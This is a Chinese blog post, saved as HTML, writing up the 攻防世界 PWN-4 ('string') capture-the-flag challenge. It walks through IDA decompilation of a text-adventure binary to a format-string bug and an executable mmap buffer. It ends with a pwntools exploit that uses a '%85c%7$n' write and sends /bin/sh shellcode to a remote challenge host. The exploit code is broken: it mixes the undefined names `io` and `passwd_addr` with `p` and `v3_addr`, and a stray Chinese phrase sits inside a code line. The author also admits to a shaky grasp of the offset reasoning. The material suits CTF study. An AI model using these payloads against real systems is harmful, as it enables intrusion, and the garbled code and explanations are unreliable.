@@ -1,0 +1,192 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>gf-4 | 墨水彩笔</title><meta name="author" content="徐小宇"><meta name="copyright" content="徐小宇"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="攻防世界PWN-4（string）目录1.知识点分析 2.程序的运行流程分析+漏洞点 3.解析 知识点1.关于二进制文件的基础学习（汇编语言的知识） 2.有关格式化字符串漏洞的解析（目前我也还没完全明白，等我明白后会独立更新） 程序的分析和运行1.现在自己的虚拟机中跑一下程序。 2.使用虚拟机中的checksec+文件名先查看二进制文件的信息和保护机制。  3.将二进制文件放入IDA中解析，我首先">
+<meta property="og:type" content="article">
+<meta property="og:title" content="gf-4">
+<meta property="og:url" content="http://example.com/2021/06/13/gf-4/index.html">
+<meta property="og:site_name" content="墨水彩笔">
+<meta property="og:description" content="攻防世界PWN-4（string）目录1.知识点分析 2.程序的运行流程分析+漏洞点 3.解析 知识点1.关于二进制文件的基础学习（汇编语言的知识） 2.有关格式化字符串漏洞的解析（目前我也还没完全明白，等我明白后会独立更新） 程序的分析和运行1.现在自己的虚拟机中跑一下程序。 2.使用虚拟机中的checksec+文件名先查看二进制文件的信息和保护机制。  3.将二进制文件放入IDA中解析，我首先">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2021-06-13T07:35:03.000Z">
+<meta property="article:modified_time" content="2021-06-13T08:57:34.935Z">
+<meta property="article:author" content="徐小宇">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/06/13/gf-4/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  hexoversion: '5.2.0',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isSidebar: true,
+  postUpdate: '2021-06-13 16:57:34'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {
+  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }
+})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">30</div></a></div></div></div><hr/></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-4%EF%BC%88string%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">攻防世界PWN-4（string）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-number">1.1.</span> <span class="toc-text">目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.2.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%9E%90%E5%92%8C%E8%BF%90%E8%A1%8C"><span class="toc-number">1.3.</span> <span class="toc-text">程序的分析和运行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E4%B8%80%E6%AD%A5%E6%AD%A5%E8%A7%A3%E6%9E%90%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%BF%90%E8%A1%8C%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">4.一步步解析程序的运行：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">知识点：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.4.1.</span> <span class="toc-text">格式化字符串漏洞的简单分析：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">1.5.</span> <span class="toc-text">EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">1.5.1.</span> <span class="toc-text">总结：</span></a></li></ol></li></ol></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">墨水彩笔</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">gf-4</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-06-13T07:35:03.000Z" title="Created 2021-06-13 15:35:03">2021-06-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-06-13T08:57:34.935Z" title="Updated 2021-06-13 16:57:34">2021-06-13</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="攻防世界PWN-4（string）"><a href="#攻防世界PWN-4（string）" class="headerlink" title="攻防世界PWN-4（string）"></a>攻防世界PWN-4（string）</h1><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>1.知识点分析</p>
+<p>2.程序的运行流程分析+漏洞点</p>
+<p>3.解析</p>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>1.关于二进制文件的基础学习（汇编语言的知识）</p>
+<p>2.有关格式化字符串漏洞的解析（目前我也还没完全明白，等我明白后会独立更新）</p>
+<h2 id="程序的分析和运行"><a href="#程序的分析和运行" class="headerlink" title="程序的分析和运行"></a>程序的分析和运行</h2><p>1.现在自己的虚拟机中跑一下程序。</p>
+<p>2.使用虚拟机中的<strong>checksec+文件名</strong>先查看二进制文件的信息和保护机制。</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/gf-4/image-20210613154133960.png?raw=true" alt="image-20210613154133960.png"></p>
+<p>3.将二进制文件放入IDA中解析，我首先喜欢使用shift+F12看看有什么关键的函数漏洞，在此体中没有发现什么明显的内容。</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/gf-4/image-20210613153825509.png?raw=true" alt="image-20210613153825509.png"></p>
+<h2 id="4-一步步解析程序的运行："><a href="#4-一步步解析程序的运行：" class="headerlink" title="4.一步步解析程序的运行："></a>4.一步步解析程序的运行：</h2><p>1.首先进入进入Main函数观察（为什么是main函数呢？联想c语言，我们可以知道这些函数中main为主程序，可以在其中调用其他的函数程序，但不一定完成如此）。</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/gf-4/image-20210613154506008.png?raw=true" alt="image-20210613154506008.png"></p>
+<p>发现main函数中有Printf语句会泄露v4的地址内容。（secret[0] is %x）</p>
+<p>2.进入sub_400D72函数：</p>
+<p>在进入之前先将v4的使用int()函数转化为16进制的内容。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall sub_400D72(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  char s[24]; &#x2F;&#x2F; [rsp+10h] [rbp-20h] BYREF</span><br><span class="line">  unsigned __int64 v3; &#x2F;&#x2F; [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; __readfsqword(0x28u);						</span><br><span class="line">  puts(&quot;What should your character&#39;s name be:&quot;);			</span><br><span class="line">  _isoc99_scanf(&quot;%s&quot;);</span><br><span class="line">  if ( strlen(s) &lt;&#x3D; 0xC )					&#x2F;&#x2F;判断新创建的角色名是否符合规矩</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Creating a new player.&quot;);</span><br><span class="line">    sub_400A7D();							&#x2F;&#x2F;调用第一个子程序</span><br><span class="line">    sub_400BB9(&quot;Creating a new player.&quot;, s);</span><br><span class="line">    sub_400CA6(a1);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Hei! What&#39;s up!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用sub_400A7D():</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 sub_400A7D()</span><br><span class="line">&#123;</span><br><span class="line">  char s1[8]; &#x2F;&#x2F; [rsp+0h] [rbp-10h] BYREF</span><br><span class="line">  unsigned __int64 v2; &#x2F;&#x2F; [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  puts(&quot; This is a famous but quite unusual inn. The air is fresh and the&quot;);</span><br><span class="line">  puts(&quot;marble-tiled ground is clean. Few rowdy guests can be seen, and the&quot;);</span><br><span class="line">  puts(&quot;furniture looks undamaged by brawls, which are very common in other pubs&quot;);</span><br><span class="line">  puts(&quot;all around the world. The decoration looks extremely valuable and would fit&quot;);</span><br><span class="line">  puts(&quot;into a palace, but in this city it&#39;s quite ordinary. In the middle of the&quot;);</span><br><span class="line">  puts(&quot;room are velvet covered chairs and benches, which surround large oaken&quot;);</span><br><span class="line">  puts(&quot;tables. A large sign is fixed to the northern wall behind a wooden bar. In&quot;);</span><br><span class="line">  puts(&quot;one corner you notice a fireplace.&quot;);</span><br><span class="line">  puts(&quot;There are two obvious exits: east, up.&quot;);</span><br><span class="line">  puts(&quot;But strange thing is ,no one there.&quot;);</span><br><span class="line">  puts(&quot;So, where you will go?east or up?:&quot;);</span><br><span class="line">  while ( 1 )			&#x2F;&#x2F;上面是一大串没有关系的内容，到这里才开始。进入一个死循环，除非达到break的条件非则无法跳出</span><br><span class="line">  &#123;</span><br><span class="line">    _isoc99_scanf(&quot;%s&quot;);</span><br><span class="line">    if ( !strcmp(s1, &quot;east&quot;) || !strcmp(s1, &quot;east&quot;) )	&#x2F;&#x2F;判断输入的是否为east是的话退出循环，否则继续询问</span><br><span class="line">      break;</span><br><span class="line">    puts(&quot;hei! I&#39;m secious!&quot;);</span><br><span class="line">    puts(&quot;So, where you will go?:&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( strcmp(s1, &quot;east&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !strcmp(s1, &quot;up&quot;) )</span><br><span class="line">      sub_4009DD();</span><br><span class="line">    puts(&quot;YOU KNOW WHAT YOU DO?&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br></pre></td></tr></table></figure>
+
+<h4 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h4><p>这里有一个陷阱：我们需要看清楚while(1)设定的循环到底是限制到了哪里。</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/gf-4/image-20210613161254375.png?raw=true" alt="image-20210613161254375.png"></p>
+<p>我们仔细观察完发现，这段的代码应该只要看这些就好了，因为如果达不到break的条件就无法退出循环。</p>
+<p>那么break到底退出到哪里呢？这个问题困扰了我很久，最后我发现还是要实际操作一下才能知道</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/gf-4/image-20210613161552413.png?raw=true" alt="image-20210613161552413.png"></p>
+<p>这里break后不是进行ssub_400A7D()中的写一个if判断，而是直接退出sub_400A7D()。</p>
+<p>那么按照汇编语言的跳转方法和返回方式，我们回到sub_400D72（）中进入sub_400BB9（）。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 sub_400BB9()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [rsp+4h] [rbp-7Ch]</span><br><span class="line">  char format[104]; &#x2F;&#x2F; [rsp+10h] [rbp-70h] BYREF</span><br><span class="line">  unsigned __int64 v3; &#x2F;&#x2F; [rsp+78h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;You travel a short distance east.That&#39;s odd, anyone disappear suddenly&quot;);</span><br><span class="line">  puts(&quot;, what happend?! You just travel , and find another hole&quot;);</span><br><span class="line">  puts(&quot;You recall, a big black hole will suckk you into it! Know what should you do?&quot;);</span><br><span class="line">  puts(&quot;go into there(1), or leave(0)?:&quot;);		&#x2F;&#x2F;这里的输出语句与程序运行一致表明我们的判断正确</span><br><span class="line">  _isoc99_scanf(&quot;%d&quot;);</span><br><span class="line">  if ( v1 &#x3D;&#x3D; 1 )								&#x2F;&#x2F;这里限制了我们的输入只能为1</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;A voice heard in your mind&quot;);</span><br><span class="line">    puts(&quot;&#39;Give me an address&#39;&quot;);</span><br><span class="line">    _isoc99_scanf(&quot;%ld&quot;);						&#x2F;&#x2F;这里要输入一个地址</span><br><span class="line">    puts(&quot;And, you wish is:&quot;);</span><br><span class="line">    _isoc99_scanf(&quot;%s&quot;);</span><br><span class="line">    puts(&quot;Your wish is&quot;);</span><br><span class="line">    printf(format, format);						&#x2F;&#x2F;这是体现漏洞函数的关键点--格式化字符串漏洞</span><br><span class="line">    puts(&quot;I hear it, I hear it....&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/gf-4/image-20210613162312443.png?raw=true" alt="image-20210613162312443.png"></p>
+<p>这三个箭头所指向的内容共同组成了格式化字符串漏洞的要求。</p>
+<h3 id="格式化字符串漏洞的简单分析："><a href="#格式化字符串漏洞的简单分析：" class="headerlink" title="格式化字符串漏洞的简单分析："></a>格式化字符串漏洞的简单分析：</h3><p>在c语言中我们加入要输出内容的话有这样的形式:printf(%s,a)。这表明了我们要输入的内容为a且a为字符串类型。但假如我们在选择类型的时候不选择对应的类型会如何呢？这就达成了格式化字符串漏洞，使用对应的%的内容可以达到对应的目的。如：查看地址，修改内容等。</p>
+<p>我们这里正好因为我们输入了一个地址（还记得最开始的时候泄露了v4的地址吗？至于为什么要用v4的地址我们还需要继续往下看），我目前只知道我们可以使用这个地址配合printf函数达到跳转并修改跳转地址内容的功能。也就是说我们可以修改v4的值。</p>
+<p>然后这一段调用也结束了，返回sub_400D72（），进入sub_400CA6(a1)。</p>
+<p>我们是时候看看a1的值是什么了：</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/gf-4/image-20210613162924280.png?raw=true" alt="image-20210613162924280.png"></p>
+<p>可以看出a1子程序中被假设的定义，因此我们追溯回调用这个子程序的内容查看：</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/gf-4/image-20210613163029111.png?raw=true" alt="image-20210613163029111.png"></p>
+<p>也就是说a1的值可以看着是被强制化为十进制的v4的内容。</p>
+<p>进入sub_400CA6(a1)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall sub_400CA6(_DWORD *a1)</span><br><span class="line">&#123;</span><br><span class="line">  void *v1; &#x2F;&#x2F; rsi</span><br><span class="line">  unsigned __int64 v3; &#x2F;&#x2F; [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!&quot;);</span><br><span class="line">  puts(&quot;Dragon say: HaHa! you were supposed to have a normal&quot;);</span><br><span class="line">  puts(&quot;RPG game, but I have changed it! you have no weapon and &quot;);</span><br><span class="line">  puts(&quot;skill! you could not defeat me !&quot;);</span><br><span class="line">  puts(&quot;That&#39;s sound terrible! you meet final boss!but you level is ONE!&quot;);</span><br><span class="line">  if ( *a1 &#x3D;&#x3D; a1[1] )			&#x2F;&#x2F;如果两数数值相同</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Wizard: I will help you! USE YOU SPELL&quot;);</span><br><span class="line">    v1 &#x3D; mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL);		&#x2F;&#x2F;可以开辟一个空间</span><br><span class="line">    read(0, v1, 0x100uLL);							&#x2F;&#x2F;这个空间可以写入0x100的内容</span><br><span class="line">    ((void (__fastcall *)(_QWORD))v1)(0LL);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因此我们找到了最后的解题关键，我们首先需要达到***a1 == a1[1]**的条件然后就可以写入shell。</p>
+<p>那么怎么满足*a1 == a1[1]也就是v4[0]==v4[1]的内容呢？这就利用到了我们刚刚发现的格式化字符串漏洞修改v[0]的内容使得条件成立。</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.arch&#x3D;&#39;amd64&#39;</span><br><span class="line">#设置目标机的参数 os设置系统为linux系统,arch设置架构为amd64</span><br><span class="line">#至于为什么要使用框架呢？因为到时候怎么手动写入shell我还没学会只能先使用工具辅助</span><br><span class="line">p&#x3D;remote(&#39;111.200.241.244&#39;,57390)       #这里是连接靶机</span><br><span class="line">#p&#x3D;process(&#39;.&#x2F;gf4&#39;)                     #这里也可以选择直接进入自己下载的二进制文件</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;secret[0] is&#39;)             </span><br><span class="line">#p.recvuntile的意思为：在p文件的基础上读取到（）里的内容为止，然后停止。</span><br><span class="line">v3_addr&#x3D;int(p.recv(7),16)    或者使用	addr &#x3D; int(p.recvuntil(‘\n‘)[:-1], 16)</span><br><span class="line">#为什么是-1倒序读入，因为二进制文件的读取方式：eg 0x8048000 在二进制文件中读取方式为\x00\x80\x04\x08 --利用汇编所学可以知道\x08为一个字节内容，8为高位，0为地位。</span><br><span class="line"># 获得的数字直接用 int(x, 16) 即可转成十进制整型储存在 addr 中</span><br><span class="line"></span><br><span class="line">io.recvuntil(&#39;name be:\n&#39;)</span><br><span class="line">io.sendline(&#39;pwn&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(&#39;east or up?:\n&#39;)</span><br><span class="line">io.sendline(&#39;east&#39;)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&#39;leave(0)?:\n&#39;)	</span><br><span class="line">io.sendline(&#39;1&#39;)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&#39;address\&#39;\n&#39;)</span><br><span class="line">io.sendline(str(passwd_addr))</span><br><span class="line">#这里就是我们给出要修改的v4的地址，然后进入（许愿）函数利用格式化字符串漏洞</span><br><span class="line">io.recvuntil(&#39;wish is:\n&#39;)</span><br><span class="line">io.sendline(&#39;%85c%7$n&#39;)</span><br><span class="line">#至于这里为什么是%7呢？我也不是很明白，我只能64位程序的传参与32位有差别，64位程序传参时前六个参数放在寄存器中，我认为第七个是判断要输出的内容的格式是什么的判断，因此输出的内容为第8个参数，因此我们输入的参数为N+1，因此这里的%后面是7.</span><br><span class="line">sh&#x3D;asm(shellcraft.amd64.sh())		#利用框架</span><br><span class="line">#（生成的shellcode攻击失败，所以使用反汇编的shellcode）</span><br><span class="line">#接下来这段是抄的！</span><br><span class="line"># （shellcode &#x3D; &quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;）</span><br><span class="line"># 注释 ：师傅没有失败只是忘了context</span><br><span class="line"># shellcraft 是一个帮忙生成shellcode的类. shellcraft.sh():获得执行system(“&#x2F;bin&#x2F;sh”)汇编代码所对应的机器码</span><br><span class="line">io.sendline(sh)			#发送Shell</span><br><span class="line">io.interactive()		#进行互动</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>懂了但没完全懂：</p>
+<p>还是没有完全搞懂格式化字符串漏洞的具体内容和具体使用方法。</p>
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">徐小宇</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/06/13/gf-4/">http://example.com/2021/06/13/gf-4/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script 